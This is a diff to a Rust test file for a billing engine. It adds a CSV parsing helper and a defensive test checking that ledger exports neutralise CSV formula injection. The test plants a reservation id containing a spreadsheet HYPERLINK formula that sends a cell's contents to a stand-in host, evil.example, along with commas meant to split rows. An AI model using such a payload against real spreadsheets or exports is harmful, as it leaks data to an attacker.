@@ -398,6 +398,80 @@ fn test_financial_reconciliation_export_csv_and_json() {
     assert!(json.contains("inv-exp"));
 }
 
+/// RFC 4180 cells of each line: quoted cells may hold commas and doubled quotes.
+fn csv_rows(csv: &str) -> Vec<Vec<String>> {
+    csv.lines()
+        .map(|line| {
+            let (mut cells, mut cell, mut quoted, mut chars) =
+                (Vec::new(), String::new(), false, line.chars().peekable());
+            while let Some(c) = chars.next() {
+                match (c, quoted) {
+                    ('"', true) if chars.peek() == Some(&'"') => {
+                        cell.push('"');
+                        chars.next();
+                    }
+                    ('"', _) => quoted = !quoted,
+                    (',', false) => cells.push(std::mem::take(&mut cell)),
+                    _ => cell.push(c),
+                }
+            }
+            cells.push(cell);
+            cells
+        })
+        .collect()
+}
+
+#[test]
+fn a_client_supplied_field_can_neither_split_a_row_nor_run_as_a_formula() {
+    let engine = BillingEngine::new();
+    let mut card = Card::new("card-csv", "group-pro-plus", 100_000_000);
+    card.status = CardStatus::Active;
+    engine.upsert_card(card);
+    let hostile = "=HYPERLINK(\"https://evil.example/?\"&A1,\"open\"),0,0,0";
+    let params = ReservationEstimateParams::new(500, 100);
+    engine
+        .reserve("card-csv", hostile, &params, 1000, 60)
+        .unwrap();
+    engine
+        .settle(
+            hostile,
+            &UsageTokens {
+                uncached_input_tokens: 500,
+                output_tokens: 100,
+                cache_creation_tokens: 0,
+                cache_read_tokens: 0,
+            },
+            "@model",
+            "prov-1",
+            "gpt-4o",
+            1005,
+        )
+        .unwrap();
+
+    let rows = csv_rows(&engine.export_ledger_csv(Some("card-csv")));
+    assert!(rows.len() >= 2);
+    for row in &rows {
+        assert_eq!(row.len(), rows[0].len(), "{row:?}");
+        for cell in row {
+            assert!(
+                !cell.starts_with(['=', '+', '@']),
+                "{cell:?} would run as a formula"
+            );
+        }
+    }
+    let usage = rows
+        .iter()
+        .find(|row| row[4].contains("HYPERLINK"))
+        .unwrap();
+    assert!(
+        usage[4].ends_with(hostile),
+        "the id itself is kept: {:?}",
+        usage[4]
+    );
+    // Numbers stay numbers for reconciliation.
+    assert!(usage[7].parse::<u64>().is_ok() && usage[9].parse::<i64>().is_ok());
+}
+
 #[test]
 fn test_data_retention_pruning_policy() {
     let engine = BillingEngine::new();
